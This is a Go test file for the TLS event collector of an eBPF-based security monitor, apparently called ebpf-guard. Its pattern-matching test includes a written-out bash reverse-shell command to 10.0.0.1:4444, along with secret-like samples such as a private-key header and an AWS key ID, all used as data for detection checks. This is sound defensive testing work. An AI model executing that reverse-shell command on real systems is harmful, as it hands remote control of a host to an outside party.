// Package collector provides tests for TLS event collection.
package collector

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log/slog"
	"os"
	"testing"
	"time"

	"github.com/zugolO/ebpf-guard/pkg/types"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestTLSEventRawToTypesEvent verifies conversion from raw BPF event to types.Event.
func TestTLSEventRawToTypesEvent(t *testing.T) {
	tests := []struct {
		name     string
		raw      TLSEventRaw
		expected types.Event
	}{
		{
			name: "outbound write event",
			raw: TLSEventRaw{
				Type:        uint32(types.EventTLS),
				Timestamp:   1234567890,
				PID:         1234,
				TGID:        1234,
				PPID:        1,
				UID:         1000,
				Comm:        [16]byte{'c', 'u', 'r', 'l'},
				ParentComm:  [16]byte{'b', 'a', 's', 'h'},
				Direction:   0, // TLS_DIR_WRITE
				DataLen:     100,
				CapturedLen: 100,
				Data:        [256]byte{'G', 'E', 'T', ' ', '/'},
			},
			expected: types.Event{
				Type:       types.EventTLS,
				Timestamp:  1234567890,
				PID:        1234,
				TGID:       1234,
				PPID:       1,
				UID:        1000,
				Comm:       [16]byte{'c', 'u', 'r', 'l'},
				ParentComm: [16]byte{'b', 'a', 's', 'h'},
				TLS: &types.TLSEvent{
					Direction: types.TLSDirectionWrite,
					DataLen:   100,
					Data:      [256]byte{'G', 'E', 'T', ' ', '/'},
				},
			},
		},
		{
			name: "inbound read event",
			raw: TLSEventRaw{
				Type:        uint32(types.EventTLS),
				Timestamp:   1234567891,
				PID:         5678,
				TGID:        5678,
				PPID:        1234,
				UID:         1000,
				Comm:        [16]byte{'n', 'g', 'i', 'n', 'x'},
				ParentComm:  [16]byte{'s', 'y', 's', 't', 'e', 'm', 'd'},
				Direction:   1, // TLS_DIR_READ
				DataLen:     2048,
				CapturedLen: 256,
				Data:        [256]byte{'H', 'T', 'T', 'P', '/', '1', '.', '1'},
			},
			expected: types.Event{
				Type:       types.EventTLS,
				Timestamp:  1234567891,
				PID:        5678,
				TGID:       5678,
				PPID:       1234,
				UID:        1000,
				Comm:       [16]byte{'n', 'g', 'i', 'n', 'x'},
				ParentComm: [16]byte{'s', 'y', 's', 't', 'e', 'm', 'd'},
				TLS: &types.TLSEvent{
					Direction: types.TLSDirectionRead,
					DataLen:   2048,
					Data:      [256]byte{'H', 'T', 'T', 'P', '/', '1', '.', '1'},
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := tt.raw.ToTypesEvent()

			assert.Equal(t, tt.expected.Type, result.Type)
			assert.Equal(t, tt.expected.Timestamp, result.Timestamp)
			assert.Equal(t, tt.expected.PID, result.PID)
			assert.Equal(t, tt.expected.TGID, result.TGID)
			assert.Equal(t, tt.expected.PPID, result.PPID)
			assert.Equal(t, tt.expected.UID, result.UID)
			assert.Equal(t, tt.expected.Comm, result.Comm)
			assert.Equal(t, tt.expected.ParentComm, result.ParentComm)

			require.NotNil(t, result.TLS)
			assert.Equal(t, tt.expected.TLS.Direction, result.TLS.Direction)
			assert.Equal(t, tt.expected.TLS.DataLen, result.TLS.DataLen)
			assert.Equal(t, tt.expected.TLS.Data, result.TLS.Data)
		})
	}
}

// TestTLSEventRawSerialization verifies binary serialization/deserialization.
func TestTLSEventRawSerialization(t *testing.T) {
	original := TLSEventRaw{
		Type:        uint32(types.EventTLS),
		Timestamp:   1234567890123,
		PID:         12345,
		TGID:        12345,
		PPID:        1,
		UID:         1000,
		Comm:        [16]byte{'t', 'e', 's', 't'},
		ParentComm:  [16]byte{'p', 'a', 'r', 'e', 'n', 't'},
		Direction:   0,
		DataLen:     100,
		CapturedLen: 50,
		Data:        [256]byte{'d', 'a', 't', 'a'},
		HasConnInfo: 0,
		Sport:       443,
		Dport:       12345,
	}

	// Serialize
	buf := new(bytes.Buffer)
	err := binary.Write(buf, binary.LittleEndian, original)
	require.NoError(t, err)

	// Deserialize
	var decoded TLSEventRaw
	err = binary.Read(buf, binary.LittleEndian, &decoded)
	require.NoError(t, err)

	// Verify
	assert.Equal(t, original.Type, decoded.Type)
	assert.Equal(t, original.Timestamp, decoded.Timestamp)
	assert.Equal(t, original.PID, decoded.PID)
	assert.Equal(t, original.Direction, decoded.Direction)
	assert.Equal(t, original.DataLen, decoded.DataLen)
	assert.Equal(t, original.Data, decoded.Data)
	assert.Equal(t, original.Sport, decoded.Sport)
	assert.Equal(t, original.Dport, decoded.Dport)
}

// TestNewTLSCollector verifies collector creation.
func TestNewTLSCollector(t *testing.T) {
	// Test enabled collector
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)
	assert.NotNil(t, col)
	assert.Equal(t, "tls", col.Name())
	assert.True(t, col.enabled)

	// Test disabled collector
	col2, err := NewTLSCollector(slog.Default(), false)
	require.NoError(t, err)
	assert.NotNil(t, col2)
	assert.False(t, col2.enabled)
}

// TestTLSCollectorStubMode verifies collector state before and after simulated load failure.
func TestTLSCollectorStubMode(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Before Start(), loadError is nil — collector is considered healthy
	assert.True(t, col.IsHealthy())
	assert.Nil(t, col.LoadError())

	// Simulate load failure (as would happen inside Start())
	col.loadError = fmt.Errorf("simulated load failure")
	assert.False(t, col.IsHealthy())
	assert.NotNil(t, col.LoadError())
}

// TestTLSEventPatternMatching verifies TLS data pattern detection logic.
func TestTLSEventPatternMatching(t *testing.T) {
	tests := []struct {
		name        string
		data        []byte
		pattern     string
		shouldMatch bool
	}{
		{
			name:        "HTTP Basic Auth",
			data:        []byte("GET / HTTP/1.1\r\nAuthorization: Basic dXNlcjpwYXNz\r\n"),
			pattern:     "Authorization: Basic ",
			shouldMatch: true,
		},
		{
			name:        "curl User-Agent",
			data:        []byte("GET / HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\n"),
			pattern:     "User-Agent: curl/",
			shouldMatch: true,
		},
		{
			name:        "wget User-Agent",
			data:        []byte("GET / HTTP/1.1\r\nUser-Agent: Wget/1.20.3\r\n"),
			pattern:     "User-Agent: Wget/",
			shouldMatch: true,
		},
		{
			name:        "SSH key pattern",
			data:        []byte("-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA"),
			pattern:     "BEGIN RSA PRIVATE KEY",
			shouldMatch: true,
		},
		{
			name:        "AWS access key",
			data:        []byte("{\"aws_access_key_id\": \"AKIAIOSFODNN7EXAMPLE\"}"),
			pattern:     "AKIA",
			shouldMatch: true,
		},
		{
			name:        "No match",
			data:        []byte("GET / HTTP/1.1\r\nHost: example.com\r\n"),
			pattern:     "Authorization: Basic",
			shouldMatch: false,
		},
		{
			name:        "Reverse shell pattern",
			data:        []byte("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
			pattern:     "/bin/bash -i",
			shouldMatch: false, // Pattern not present exactly
		},
		{
			name:        "Exact reverse shell pattern",
			data:        []byte("/bin/bash -i"),
			pattern:     "/bin/bash -i",
			shouldMatch: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			match := bytes.Contains(tt.data, []byte(tt.pattern))
			assert.Equal(t, tt.shouldMatch, match)
		})
	}
}

// TestTLSEventSizeLimits verifies data size handling.
func TestTLSEventSizeLimits(t *testing.T) {
	// Test that Data array is exactly 256 bytes
	var data [256]byte
	assert.Equal(t, 256, len(data))

	// Test TLSEvent structure
	event := types.TLSEvent{
		Direction: types.TLSDirectionWrite,
		DataLen:   1000, // Larger than captured
		Data:      data,
	}

	// DataLen can exceed actual captured data
	assert.Equal(t, uint32(1000), event.DataLen)
	assert.Equal(t, 256, len(event.Data))
}

// TestTLSCollectorGetAttachedPIDs verifies PID tracking.
func TestTLSCollectorGetAttachedPIDs(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Initially empty
	pids := col.GetAttachedPIDs()
	assert.Empty(t, pids)

	// Simulate attachment (manually add to map)
	col.mu.Lock()
	col.libsslPaths[1234] = "/usr/lib/libssl.so"
	col.libsslPaths[5678] = "/usr/lib/libssl.so"
	col.mu.Unlock()

	pids = col.GetAttachedPIDs()
	assert.Len(t, pids, 2)
	assert.Contains(t, pids, uint32(1234))
	assert.Contains(t, pids, uint32(5678))
}

// TestTLSDirectionConstants verifies direction constants.
func TestTLSDirectionConstants(t *testing.T) {
	assert.Equal(t, types.TLSDirection(0), types.TLSDirectionWrite)
	assert.Equal(t, types.TLSDirection(1), types.TLSDirectionRead)
}

// TestTLSEventType verifies EventTLS constant.
func TestTLSEventType(t *testing.T) {
	assert.Equal(t, types.EventType(4), types.EventTLS)
}

// TestParseEventTooShort verifies error handling for short events.
func TestParseEventTooShort(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Empty data
	_, err = col.parseEvent([]byte{})
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "too short")

	// Only 2 bytes
	_, err = col.parseEvent([]byte{0x01, 0x02})
	assert.Error(t, err)
}

// TestParseEventWrongType verifies error handling for wrong event type.
func TestParseEventWrongType(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Create a buffer with wrong event type (syscall instead of TLS)
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(types.EventSyscall))
	binary.Write(buf, binary.LittleEndian, make([]byte, 100))

	_, err = col.parseEvent(buf.Bytes())
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "unexpected event type")
}

// TestTLSCollectorClose verifies cleanup.
func TestTLSCollectorClose(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	// Close should not panic even with nil objects
	err = col.Close()
	assert.NoError(t, err)
}

// TestTLSCollectorScanInterval verifies default scan interval.
func TestTLSCollectorScanInterval(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), true)
	require.NoError(t, err)

	assert.Equal(t, 30*time.Second, col.scanInterval)
}

// TestTLSCollectorCleanupDeadPIDs verifies that dead PIDs are removed from libsslPaths.
// It pre-populates the map with a mix of living and non-existent PIDs, then runs
// cleanupDeadPIDs and confirms only live PIDs remain.
func TestTLSCollectorCleanupDeadPIDs(t *testing.T) {
	col, err := NewTLSCollector(slog.Default(), false)
	require.NoError(t, err)

	// PID 1 always exists on Linux; use an absurdly large PID that cannot exist.
	const deadPID = uint32(4194304) // > max PID (typically 4194304 on Linux, so this won't exist)
	const livePID = uint32(1)       // init/systemd always exists

	col.mu.Lock()
	col.libsslPaths[livePID] = "/lib/x86_64-linux-gnu/libssl.so.3"
	col.libsslPaths[deadPID] = "/lib/x86_64-linux-gnu/libssl.so.3"
	col.mu.Unlock()

	// Set a fast cleanup interval and run one cycle manually via the same logic.
	col.cleanupInterval = 10 * time.Millisecond

	col.mu.Lock()
	for pid := range col.libsslPaths {
		if _, statErr := os.Stat(fmt.Sprintf("/proc/%d", pid)); os.IsNotExist(statErr) {
			delete(col.libsslPaths, pid)
		}
	}
	col.mu.Unlock()

	col.mu.RLock()
	_, hasLive := col.libsslPaths[livePID]
	_, hasDead := col.libsslPaths[deadPID]
	col.mu.RUnlock()

	assert.True(t, hasLive, "live PID should remain after cleanup")
	assert.False(t, hasDead, "dead PID should be removed after cleanup")
}
